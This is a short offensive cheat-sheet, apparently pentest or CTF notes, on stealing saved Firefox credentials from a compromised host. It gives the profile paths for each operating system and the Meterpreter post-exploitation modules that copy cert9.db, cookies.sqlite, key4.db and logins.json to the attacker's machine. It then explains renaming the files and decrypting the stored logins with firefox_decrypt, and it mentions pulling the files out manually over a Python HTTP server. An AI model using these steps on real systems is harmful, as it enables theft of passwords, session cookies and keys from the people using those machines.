## Locations
**Windows**: C:/Users/< User >/AppData/Roaming/Mozilla/Firefox/Profiles
**Mac**: ~/Library/Application Support/Firefox/Profiles
**Linux**: ~/.mozilla/firefox/Profiles


If you have meterpreter shell you can check if firefox is in the system .
	`run post/windows/gather/enum_applications`
And if the Mozilla Firefox is in the output, that means firefox is installed.

You can now use 
	`run post/multi/gather/firefox_creds`
to copy the creds in your local system, it should copy four files into ~/.msf4/loot
make a new directory and put the files in there
`mkdir <Directory name>`
To use the decrypt tool you gotta rename the files

if the file has **cert** in the name >  **cert9.db**`
if the file has **cook** in the name > **cookies.sqlite**
if the file has **key** in the name > **key4.db**
if the file has **logi** in the name > **logins.json**

Now thats done git clone this and decrypt the files.
```bash
git clone https://github.com/unode/firefox_decrypt
python3 firefox_decrypt/firefox_decrypt.py <Directory>
```

If you don't have meterpreter shell you just gotta do it manually with python3 -m http server or someway to get the files across.

Done!
